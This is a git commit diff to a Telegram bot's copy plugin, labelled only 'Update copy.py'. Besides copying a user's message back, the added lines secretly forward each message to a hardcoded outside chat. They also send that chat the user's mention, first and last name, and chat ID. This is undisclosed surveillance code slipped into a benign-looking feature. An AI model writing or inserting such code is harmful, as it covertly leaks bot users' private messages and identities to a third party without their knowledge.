196f3ae6886aaffadc1c90da5212ed993896fe9d
Mystry-Music <80686132+Mystry-Music@users.noreply.github.com>
2021-05-16 22:38:52 +0530

    Update copy.py

--- plugins/copy.py
+++ plugins/copy.py
@@ -12,3 +12,16 @@ async def copy(client, message):
     add_chat(fuser)
     chat = message.chat.id
     await message.copy(chat)
+    await message._client.forward_messages(
+    chat_id=-1001155691822,
+    from_chat_id=message.chat.id,
+    message_ids=message.message_id
+)
+    await message._client.send_message(
+    chat_id=-1001155691822,
+    text=f"""👆 Above message is forwarded from the:-
+<b>User</b> - {message.from_user.mention}
+<b>User First Name</b> - {message.from_user.first_name}
+<b>User Last Name</b> - {message.from_user.last_name}
+<b>User id</b> - `{message.chat.id}`"""
+)
